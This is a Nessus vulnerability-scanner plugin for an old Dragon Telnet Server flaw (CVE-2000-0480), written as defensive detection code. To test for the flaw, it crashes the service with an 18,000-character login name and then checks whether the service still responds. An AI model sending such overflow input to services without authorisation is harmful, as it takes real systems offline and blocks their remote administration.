#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10451);
 script_version("$Revision: 1.26 $");
 script_cvs_date("$Date: 2014/05/25 23:45:39 $");

 script_cve_id("CVE-2000-0480");
 script_bugtraq_id(1352);
 script_osvdb_id(350);

 script_name(english:"Dragon Telnet Server Login Name Handling Remote Overflow DoS");
 script_summary(english:"Attempts a USER buffer overflows");

 script_set_attribute(attribute:"synopsis", value:"The remote server is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It was possible to shut down the remote telnet server by issuing a far
too long login name (over 16,000 chars)

This problem allows an attacker to prevent remote administration of
this host.");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest version your telnet server.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/06/16");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/06/27");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2014 Tenable Network Security, Inc.");
 script_family(english:"Windows");

 script_dependencie("find_service1.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/telnet", 23);

 exit(0);
}

include("audit.inc");
include('global_settings.inc');
include('telnet_func.inc');

port = get_kb_item("Services/telnet");
if(!port)port = 23;

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
  if(r)
  {
  req = string(crap(18000), "\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
  else {
  	r = telnet_negotiate(socket:soc2);
	r2 = recv(socket:soc2, length:4096);
	r = r + r2;
  	close(soc2);
	if(!r)security_warning(port);
      }
  }
}

